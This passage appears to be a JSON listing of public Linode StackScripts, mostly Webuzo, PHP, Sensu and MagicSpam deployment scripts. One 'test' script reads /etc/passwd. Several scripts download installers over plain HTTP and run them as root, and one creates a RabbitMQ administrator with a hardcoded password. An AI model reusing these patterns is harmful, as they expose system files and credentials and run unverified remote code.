      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Little Software Stats and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Little Software Stats has been successfully installed\"\necho
      \" \"\necho \"You can now configure Little Software Stats and Softaculous Webuzo
      at the following URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank
      you for choosing Softaculous Webuzo !\"\necho \" \"", "user_defined_fields":
      []}, {"id": 1193755, "username": "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd",
      "label": "PHP", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts",
      "linode/centos7", "linode/debian8", "linode/fedora22"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "v1.0.1", "script": "#!/usr/bin/env
      python\n\n\"\"\"\nPHP StackScript\n\t\n\tAuthor: Ricardo N Feliciano <rfeliciano@linode.com>\n\tVersion:
      1.0.1.2\n\tRequirements:\n\t\t- ss://linode/python-library <ssinclude StackScriptID=\"3\">\n\nThis
      StackScript both deploys as well as provides a library of functions for\nPHP.
      The functions in this StackScript are designed to be run across the \nLinode
      Core Distributions:\n\t- Ubuntu\n\t- CentOS\n\t- Debian\n\t- Fedora\n\"\"\"\n\nimport
      os\nimport subprocess\nimport sys\n\ntry: # we''ll need to rename included StackScripts
      before we can import them\n\tos.rename(\"/root/ssinclude-3\", \"/root/pythonlib.py\")\nexcept:\n\tpass\n\nimport
      pythonlib\n\n\ndef php_apache_mod_install():\n\t\"\"\"Install Apache httpd PHP
      module.\"\"\"\n\t# add logging support\n\n\tpackage = {\n\t\t''debian'': ''php5'',\n\t\t''redhat'':
      ''php''\n\t}\n\n\tpythonlib.system_package_install(package[pythonlib.distro[''family'']])\n\n\n#def
      php_fpm_install():\n\n\ndef php_install():\n\t\"\"\"Install PHP.\n\t\n\tDefaults
      to installing the mod_PHP implemention of PHP.\n\t\"\"\"\n\t# add logging support\n\n\tphp_apache_mod_install()\n\n\ndef
      php_install_module(module, update_index=True):\n\t\"\"\"Install a PHP module.\"\"\"\n\n\tprefix
      = {\n\t\t''debian'': ''php5-'',\n\t\t''redhat'': ''php-''\n\t}\n\n\tpythonlib.system_package_install(prefix[pythonlib.distro[''family'']]
      + module, update_index)\n\n\ndef php_install_module_common():\n\t\"\"\"Install
      most common PHP modules.\n\n\tInstall GD, mcrypt, pear, mysql, and the cli.\"\"\"\n\t\n\tphp_install_module(\"gd\")\n\t#php_install_module(\"mcrypt\",
      False) #not in CentOS7 repos :(\n\t#php_install_module(\"pear\", False) # both
      families use php-pear so\n\t#installing php5-pear in the Debian family will
      fail\n\tphp_install_module(\"mysql\", False)\n\tphp_install_module(\"cli\",
      False)\n\trestart()\n\n\ndef restart():\n\tif pythonlib.distro[''family''] ==
      \"debian\":\n\t\tsubprocess.call([''service'', ''apache2'', ''restart''])\n\telif
      pythonlib.distro[''family''] == \"redhat\":\n\t\tsubprocess.call([''systemctl'',
      ''restart'', ''httpd''])\n\n\ndef main():\n\t\"\"\"Install PHP.\"\"\"\n\t# add
      logging support\n\t\n\tpythonlib.init()\n\tpythonlib.system_update()\n\tphp_install()\n\n\tpythonlib.end()\n\n\nif
      __name__ == \"__main__\":\n\tsys.exit(main())", "user_defined_fields": []},
      {"id": 1158683, "username": "yoboycc", "user_gravatar_id": "e598b7c77d05460a72ceb4397cbc72f6",
      "label": "snapchat", "description": "", "ordinal": 0, "logo_url": "", "images":
      ["linode/debian11"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "", "script": "#!/bin/bash\nhttps://104-200-19-103.ip.linodeusercontent.com:3000/demos/butcher/index.html",
      "user_defined_fields": []}, {"id": 978971, "username": "meenubediShine", "user_gravatar_id":
      "ac16f37ccd972a6f698dab5aab1188b2", "label": "test", "description": "test",
      "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.13"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "revision", "script": "#!/bin/bash\r\ntest",
      "user_defined_fields": []}, {"id": 9244, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "DIY powered by Webuzo", "description":
      "DIY is an open-source lightweight web application framework based on object-oriented
      PHP 5, MySQL, and XSLT. It is fully object-oriented and designed following the
      MVC architecture and REST design principles. The idea behind it is not to reinvent
      the wheel but instead to combine existing and proven technologies in a convenient
      and effective way.\r\n\r\nWebuzo is a Single User Control Panel which helps
      users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps (Apache,
      NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\r\n\r\nYou
      can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to
      Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure DIY and
      Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "DIY powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install DIY and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About DIY :\n#   DIY is
      an open-source lightweight web application framework based on object-oriented
      PHP 5, MySQL, and XSLT.\n#   It is fully object-oriented and designed following
      the MVC architecture and REST design principles.\n#   The idea behind it is
      not to reinvent the wheel but instead to combine existing and \n#   proven technologies
      in a convenient and effective way.\n###########################################################################################################\n\n#
      Install DIY Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=242&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      DIY and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, DIY has been successfully installed\"\necho \" \"\necho \"You
      can now configure DIY and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 665116, "username":
      "prod-test-012", "user_gravatar_id": "9c7a651c63f3cefe52654946e9b46bd2", "label":
      "test public2", "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/alpine3.10"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "", "script": "#!/bin/bash test", "user_defined_fields": []}, {"id": 1193756,
      "username": "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd",
      "label": "MagicSpam One-Click", "description": "MagicSpam One-Click", "ordinal":
      0, "logo_url": "", "images": ["linode/centos7"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\n\n# <UDF name=\"control_panel\"
      Label=\"The Control Panel to deploy alongside with MagicSpam. Make sure to select
      an Image supported by the selected Control Panel. For more information, please
      refer to the MagicSpam App Information Sidebar.\" oneof=\"cPanel,Plesk\">\n#
      <UDF name=\"ms_license_key\" Label=\"The MagicSpam license key. Please make
      sure to use the appropriate license key for the selected Control Panel. For
      more information, please refer to the MagicSpam App information sidebar.\">\n#
      <UDF name=\"hostname\" label=\"The server''s hostname.\">\n\n# source the stackscript
      for the selected control panel\nif [ \"$CONTROL_PANEL\" == \"cPanel\" ]; then\n    #
      redirect ALL output to the stackscript log for future troubleshooting\n    exec
      > >(tee /dev/ttyS0 /var/log/stackscript.log) 2>&1\n\n    # cPanel Marketplace
      App install\n    source <ssinclude StackScriptID=595742>\n\n    # set the hostname
      to replicate Plesk stackscript for consistent behavior\n    IPADDR=$(/sbin/ifconfig
      eth0 | awk ''/inet / { print $2 }'' | sed ''s/addr://'')\n    echo $HOSTNAME
      > /etc/hostname\n    hostname -F /etc/hostname\n    echo $IPADDR $HOSTNAME >>
      /etc/hosts\nelif [ \"$CONTROL_PANEL\" == \"Plesk\" ]; then\n    # Plesk Marketplace
      App install\n    # NOTE: do not redirect output to the stackscript log to avoid
      duplicate log\n    #       lines as the Plesk stackscript already redirects
      to it\n    source <ssinclude StackScriptID=593835>\nelse\n    echo \"Invalid
      control panel option detected. Aborting...\"\n    exit 1\nfi\n\n# install MagicSpam
      via the installer script\nwget https://www.magicspam.com/download/magicspam-installer.sh
      -O /root/magicspam-installer\nchmod +x /root/magicspam-installer\n/root/magicspam-installer
      -l \"$MS_LICENSE_KEY\"", "user_defined_fields": [{"name": "control_panel", "label":
      "The Control Panel to deploy alongside with MagicSpam. Make sure to select an
      Image supported by the selected Control Panel. For more information, please
      refer to the MagicSpam App Information Sidebar.", "oneof": "cPanel,Plesk"},
      {"name": "ms_license_key", "label": "The MagicSpam license key. Please make
      sure to use the appropriate license key for the selected Control Panel. For
      more information, please refer to the MagicSpam App information sidebar."},
      {"name": "hostname", "label": "The server''s hostname."}]}, {"id": 14364, "username":
      "ezan", "user_gravatar_id": "40bba314333f02cceb3f40d8a2aabb78", "label": "configure-repo-sensu",
      "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\nset -eux\n\ncurl -s http://repos.sensuapp.org/apt/pubkey.gpg
      | apt-key add -\necho \"deb http://repos.sensuapp.org/apt sensu main\" > /etc/apt/sources.list.d/sensu.list\n\napt-get
      update -q", "user_defined_fields": []}, {"id": 978972, "username": "meenubediShine",
      "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2", "label": "test", "description":
      "test description", "ordinal": 0, "logo_url": "", "images": ["linode/opensuse15.2",
      "linode/alpine3.13"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "revision", "script": "#!/bin/bash\r\ntest", "user_defined_fields":
      []}, {"id": 8989, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Joomla 2.5 powered by Webuzo", "description": "Joomla is an award-winning
      content management system (CMS), which enables you to build Web sites and powerful
      online applications. Many aspects, including its ease-of-use and extensibility,
      have made Joomla the most popular Web site software available. Best of all,
      Joomla is an open source solution that is freely available to everyone. \r\n\r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Joomla 2.5 and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "Joomla 2.5 powered by Webuzo",
      "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\" label=\"Premium Webuzo
      License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Joomla 2.5 and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Joomla 2.5 :\n#   Joomla
      is an award-winning content management system (CMS), which enables you to build
      Web sites and powerful\n#   online applications. Many aspects, including its
      ease-of-use and extensibility, have made Joomla the most\n#   popular Web site
      software available. Best of all, Joomla is an open source solution \n#   that
      is freely available to everyone.\n###########################################################################################################\n\n#
      Install Joomla 2.5 Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=18&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Joomla 2.5 and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Joomla 2.5 has been successfully installed\"\necho \" \"\necho
      \"You can now configure Joomla 2.5 and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9245, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "ShopSite
      powered by Webuzo", "description": "ShopSite is the easiest-to-use shopping
      cart software for small to medium-sized businesses. With our e-commerce software
      and intuitive interface, you can have a store online in 15 minutes. With our
      rich feature set you won''t outgrow our catalog software, and you will not need
      expensive add-ons in order to have a fully functioning cart.\r\n\r\nWith our
      rich feature set you won''t outgrow our catalog software, and you will not need
      expensive add-ons in order to have a fully functioning cart. \r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      ShopSite and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "ShopSite powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install ShopSite and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About ShopSite :\n#   ShopSite
      is the easiest-to-use shopping cart software for small to medium-sized businesses.\n#   With
      our e-commerce software and intuitive interface, you can have a store online
      in 15 minutes.\n#   With our rich feature set you won''t outgrow our catalog
      software, and you will not need expensive \n#   add-ons in order to have a fully
      functioning cart.\n###########################################################################################################\n\n#
      Install ShopSite Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=410&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      ShopSite and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, ShopSite has been successfully installed\"\necho \" \"\necho
      \"You can now configure ShopSite and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 14365, "username":
      "ezan", "user_gravatar_id": "40bba314333f02cceb3f40d8a2aabb78", "label": "configure-rabbitmq-sensu",
      "description": "", "ordinal": 0, "logo_url": "", "images": ["linode/ubuntu14.04lts"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Initial import", "script": "#!/bin/bash\n##\n# Configures RabbitMQ for Sensu\n#\n#
      Dependencies:\n# - RabbitMQ\n##\nset -eux\n\nrabbitmqctl add_vhost sensu\nrabbitmqctl
      add_user sensu monit0r\nrabbitmqctl set_permissions -p sensu sensu \".*\" \".*\"
      \".*\"\nrabbitmqctl set_user_tags sensu administrator", "user_defined_fields":
      []}, {"id": 978973, "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
      "label": "test", "description": "test", "ordinal": 0, "logo_url": "", "images":
      ["linode/slackware14.1", "linode/ubuntu20.04", "linode/alpine3.13", "linode/alpine3.15"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "revision", "script": "#!/bin/bash\r\ntest", "user_defined_fields": []}, {"id":
      7198, "username": "kidid", "user_gravatar_id": "0bcff359135eea23d1cc1306ef31b413",
      "label": "ddad", "description": "fsfgg", "ordinal": 0, "logo_url": "", "images":
      ["linode/centos5.632bit"], "deployments_total": 0, "deployments_active": 0,
      "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash",
      "user_defined_fields": []}, {"id": 9246, "username": "webuzo", "user_gravatar_id":
      "cf0348f835d60e6d133040f49bb36ec5", "label": "phpLiteAdmin powered by Webuzo",
      "description": "phpLiteAdmin is a web-based SQLite database admin tool written
      in PHP with support for SQLite2 and SQLite3. \r\n\t\t\t\r\nWebuzo is a Single
      User Control Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal,
      etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual
      machines or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure phpLiteAdmin
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "phpLiteAdmin powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install phpLiteAdmin and Softaculous Webuzo\n# Description -\n# About Webuzo
      :\n#   Webuzo is a Single User Control Panel which helps users deploy Web Apps
      (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java,
      MongoDB, etc) on their virtual machines or in the cloud.\n#\n# About phpLiteAdmin
      :\n#   phpLiteAdmin is a web-based SQLite database admin tool written in PHP
      with support for SQLite2 and SQLite3. \n###########################################################################################################\n\n#
      Install phpLiteAdmin Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=431&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      phpLiteAdmin and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, phpLiteAdmin has been successfully installed\"\necho \" \"\necho
      \"You can now configure phpLiteAdmin and Softaculous Webuzo at the following
      URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing
      Softaculous Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 14366,
      "username": "ezan", "user_gravatar_id": "40bba314333f02cceb3f40d8a2aabb78",
      "label": "install-opentsdb", "description": "", "ordinal": 0, "logo_url": "",
      "images": ["linode/ubuntu14.04lts"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "Initial import", "script": "#!/bin/bash\n##\n#
      Installs OpenTSDB from source\n#\n# Provides:\n# - HTTP (TCP/4242)\n#\n# Dependencies:\n#
      - HBase (TCP/9000)\n# - ZooKeeper (TCP/2181)\n##\nset -eux\n\nsource env.sh\n\n#
      Install dependencies\napt-get install -yq openjdk-7-jre-headless\n\n# Install
      OpenTSDB\ncd /tmp\n\ncurl -sOL https://github.com/OpenTSDB/opentsdb/releases/download/v${OPENTSDB_VERSION}/opentsdb-${OPENTSDB_VERSION}_all.deb\ndpkg
      -i opentsdb-${OPENTSDB_VERSION}_all.deb\n\n# Create tables in HBase\nexport
      HBASE_HOME=/opt/hbase\nexport COMPRESSION=NONE\n\n/usr/share/opentsdb/tools/create_table.sh\n\n#
      Configure OpenTSDB\ncp $BASE_PATH/etc/opentsdb/opentsdb.conf /etc/opentsdb\n\n#
      Start OpenTSDB\nservice opentsdb start", "user_defined_fields": []}, {"id":
      705310, "username": "dmc3", "user_gravatar_id": "3661544ff6045ff4ba8e4be7ac9c5819",
      "label": "test", "description": "test", "ordinal": 0, "logo_url": "", "images":
      ["linode/debian9"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "test", "script": "#!/bin/bash\n\ncat /etc/passwd", "user_defined_fields":
      []}, {"id": 8991, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Drupal powered by Webuzo", "description": "Drupal is an open-source
      platform and content management system for building dynamic web sites offering
      a broad range of features and services including user administration, publishing
      workflow, discussion capabilities, news aggregation, metadata functionalities
      using controlled vocabularies and XML publishing for content sharing purposes.\r\n\t\t\t\r\nWebuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc)
      on their virtual machines or in the cloud.\r\n\r\nYou can get a Webuzo License
      here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn
      completion of the installation process, access http://your-ip:2004 to configure
      Drupal and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Drupal powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Drupal and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Drupal :\n#   Drupal
      is an open-source platform and content management system for building dynamic
      web sites \n#   offering a broad range of features and services including user
      administration, publishing workflow,\n#   discussion capabilities, news aggregation,
      metadata functionalities using controlled vocabularies \n#   and XML publishing
      for content sharing purposes.\n###########################################################################################################\n\n#
      Install Drupal Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=30&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Drupal and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Drupal has been successfully installed\"\necho \" \"\necho
      \"You can now configure Drupal and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9247, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "UIkit
      powered by Webuzo", "description": "UIkit A lightweight and modular front-end
